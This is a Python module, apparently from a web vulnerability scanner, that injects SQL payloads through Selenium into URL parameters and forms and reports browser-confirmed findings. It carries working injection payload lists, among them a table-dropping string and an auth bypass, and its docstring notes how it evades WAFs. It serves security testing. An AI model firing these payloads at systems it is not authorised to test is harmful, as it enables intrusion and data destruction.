"""Selenium-powered SQL Injection detection module.

Uses a real browser to inject SQL payloads, which:
  1. Handles JavaScript-driven forms and CSRF tokens automatically.
  2. Detects error messages rendered by client-side JS frameworks.
  3. Captures screenshot evidence of every confirmed SQLi.
  4. Works through WAFs that fingerprint non-browser user agents.
"""

from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (
    TimeoutException,
    WebDriverException,
    NoSuchElementException,
    StaleElementReferenceException,
)

from scanner.core.browser import create_browser, inject_cookie, take_screenshot
from scanner.utils.logger import get_logger

log = get_logger("sqli_selenium")

# ── Error signatures ────────────────────────────────────────────────
_SQL_ERROR_RE = re.compile(
    r"(SQL syntax.*?MySQL|Warning.*?\Wmysqli?_|"
    r"ORA-\d{5}|Oracle.*?Driver|"
    r"PostgreSQL.*?ERROR|pg_query|"
    r"Microsoft.*?ODBC|Microsoft.*?SQL Server|"
    r"\bSQLite.*?(?:error|warning)|"
    r"Unclosed quotation mark|"
    r"syntax error.*?SQL|"
    r"SQLSTATE\[|"
    r"mysql_fetch_array|"
    r"You have an error in your SQL syntax)",
    re.IGNORECASE,
)

PAYLOADS_QUICK = [
    "' OR '1'='1",
    "1' OR '1'='1' --",
    '" OR "1"="1',
    "1 OR 1=1",
    "' UNION SELECT NULL--",
]

PAYLOADS_FULL = PAYLOADS_QUICK + [
    "1' AND '1'='2",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "1; DROP TABLE test--",
    "' OR ''='",
    "1' AND SLEEP(0)--",  # safe sleep(0) to confirm syntax acceptance
]


def _inject_param_url(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _check_sqli_in_page(driver: webdriver.Chrome) -> str | None:
    """Check the browser page source for SQL error patterns."""
    try:
        page_text = driver.page_source
    except WebDriverException:
        return None
    match = _SQL_ERROR_RE.search(page_text)
    return match.group(0) if match else None


def _get_page_text_hash(driver: webdriver.Chrome) -> int:
    """Return a rough hash of the visible text content for boolean-based detection."""
    try:
        body = driver.find_element(By.TAG_NAME, "body")
        return hash(body.text)
    except (WebDriverException, NoSuchElementException):
        return 0


def _test_get_params(
    driver: webdriver.Chrome,
    url: str,
    param: str,
    quick: bool,
    evidence_dir: str | None,
) -> dict[str, Any] | None:
    """Inject SQL payloads into a GET parameter via the browser."""
    payloads = PAYLOADS_QUICK if quick else PAYLOADS_FULL

    # Get baseline page hash for boolean-based comparison
    try:
        driver.get(url)
        time.sleep(0.15)
        baseline_hash = _get_page_text_hash(driver)
    except (TimeoutException, WebDriverException):
        baseline_hash = 0

    for payload in payloads:
        target = _inject_param_url(url, param, payload)
        try:
            driver.get(target)
            time.sleep(0.15)
        except TimeoutException:
            continue
        except WebDriverException:
            continue

        # Error-based detection
        error_match = _check_sqli_in_page(driver)
        if error_match:
            log.info("[SQLi] Error-based on %s param=%s payload=%s", url, param, payload)
            screenshot = None
            if evidence_dir:
                screenshot = take_screenshot(
                    driver, f"sqli_error_{urlparse(url).path}_{param}", evidence_dir
                )
            return {
                "sqli_type": "Error-based",
                "parameter": param,
                "payload": payload,
                "evidence": error_match,
                "url": url,
                "screenshot": screenshot,
            }

        # Boolean-based detection: tautology should change the page
        if "OR" in payload.upper() and "'1'='1" in payload:
            current_hash = _get_page_text_hash(driver)
            if current_hash != baseline_hash and current_hash != 0:
                log.info("[SQLi] Boolean-based on %s param=%s payload=%s", url, param, payload)
                screenshot = None
                if evidence_dir:
                    screenshot = take_screenshot(
                        driver, f"sqli_boolean_{urlparse(url).path}_{param}", evidence_dir
                    )
                return {
                    "sqli_type": "Boolean-based Blind",
                    "parameter": param,
                    "payload": payload,
                    "evidence": "Page content changed with tautology payload",
                    "url": url,
                    "screenshot": screenshot,
                }

    return None


def _test_form_selenium(
    driver: webdriver.Chrome,
    form: dict[str, Any],
    quick: bool,
    evidence_dir: str | None,
) -> list[dict[str, Any]]:
    """Inject SQL payloads into form fields using the browser."""
    findings: list[dict[str, Any]] = []
    payloads = PAYLOADS_QUICK[:1] if quick else PAYLOADS_QUICK[:3]

    # In quick mode, test only the first injectable field
    injectable = [
        inp for inp in form["inputs"]
        if inp["name"] and inp["type"] not in ("submit", "button", "image", "reset", "file")
    ]
    if quick:
        injectable = injectable[:1]

    for inp in injectable:
        name = inp["name"]

        for payload in payloads:
            try:
                driver.get(form["action"])
                time.sleep(0.15)

                # Fill form fields
                for field in form["inputs"]:
                    fname = field["name"]
                    if not fname:
                        continue
                    try:
                        el = driver.find_element(By.CSS_SELECTOR, f'[name="{fname}"]')
                        el.clear()
                        if fname == name:
                            el.send_keys(payload)
                        elif field["type"] == "password":
                            el.send_keys("test123")
                        elif field["value"]:
                            el.send_keys(field["value"])
                        else:
                            el.send_keys("test")
                    except (NoSuchElementException, StaleElementReferenceException):
                        continue

                # Submit
                try:
                    submit = driver.find_element(
                        By.CSS_SELECTOR,
                        'input[type="submit"], button[type="submit"], button:not([type])'
                    )
                    submit.click()
                except NoSuchElementException:
                    try:
                        driver.find_element(By.TAG_NAME, "form").submit()
                    except WebDriverException:
                        continue

                time.sleep(0.2)

                error_match = _check_sqli_in_page(driver)
                if error_match:
                    log.info("[SQLi] Error-based (form) on %s param=%s", form["action"], name)
                    screenshot = None
                    if evidence_dir:
                        screenshot = take_screenshot(
                            driver, f"sqli_form_{name}", evidence_dir
                        )
                    findings.append({
                        "sqli_type": "Error-based",
                        "parameter": name,
                        "payload": payload,
                        "evidence": error_match,
                        "url": form["action"],
                        "screenshot": screenshot,
                    })
                    break  # one confirmation per field is enough

            except (TimeoutException, WebDriverException):
                continue

    return findings


# ── Public API ──────────────────────────────────────────────────────

def test_sqli_selenium(
    endpoints: list[str],
    forms: list[dict[str, Any]],
    cookie: str | None = None,
    headless: bool = True,
    quick: bool = False,
    evidence_dir: str | None = None,
) -> list[dict[str, Any]]:
    """Run SQL injection tests using a real browser.

    Returns a list of confirmed finding dicts with optional screenshot paths.
    """
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()  # (path, param) dedup

    if evidence_dir:
        import os
        os.makedirs(evidence_dir, exist_ok=True)

    # Cap endpoints to avoid extremely long browser scans
    max_endpoints = 20 if quick else 30
    capped_endpoints = endpoints[:max_endpoints]

    with create_browser(headless=headless) as driver:
        if cookie and capped_endpoints:
            inject_cookie(driver, capped_endpoints[0], cookie)

        # ── GET parameter injection ─────────────────────────────
        for url in capped_endpoints:
            params = parse_qs(urlparse(url).query)
            path = urlparse(url).path
            for param in params:
                sig = (path, param)
                if sig in seen:
                    continue
                result = _test_get_params(driver, url, param, quick, evidence_dir)
                if result:
                    findings.append(_to_finding(result))
                    seen.add(sig)

        # ── POST form injection ─────────────────────────────────
        form_seen: set[tuple[str, str]] = set()
        form_limit = 10 if quick else 15
        for form in forms[:form_limit]:
            if form["method"] != "POST":
                continue
            form_results = _test_form_selenium(driver, form, quick, evidence_dir)
            for r in form_results:
                form_sig = (urlparse(r["url"]).path, r["parameter"])
                if form_sig not in form_seen:
                    findings.append(_to_finding(r))
                    form_seen.add(form_sig)

    log.info("Selenium SQLi scan complete — %d confirmed findings", len(findings))
    return findings


def _to_finding(raw: dict[str, Any]) -> dict[str, Any]:
    sqli_type = raw["sqli_type"]
    if sqli_type == "Error-based":
        severity, score = "High", 8.6
    else:
        severity, score = "High", 7.5

    finding: dict[str, Any] = {
        "title": f"SQL Injection ({sqli_type}) on {urlparse(raw['url']).path} (Browser-confirmed)",
        "severity": severity,
        "cvss_score": score,
        "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "affected_url": raw["url"],
        "parameter": raw["parameter"],
        "payload": raw["payload"],
        "evidence": raw["evidence"][:500],
        "confirmed_in_browser": True,
        "remediation": "Use parameterised queries / prepared statements for all database access. "
                       "Apply least-privilege to DB accounts. Validate and sanitise all input.",
        "owasp_category": "A05:2025 - Injection",
    }
    if raw.get("screenshot"):
        finding["screenshot"] = raw["screenshot"]
    return finding
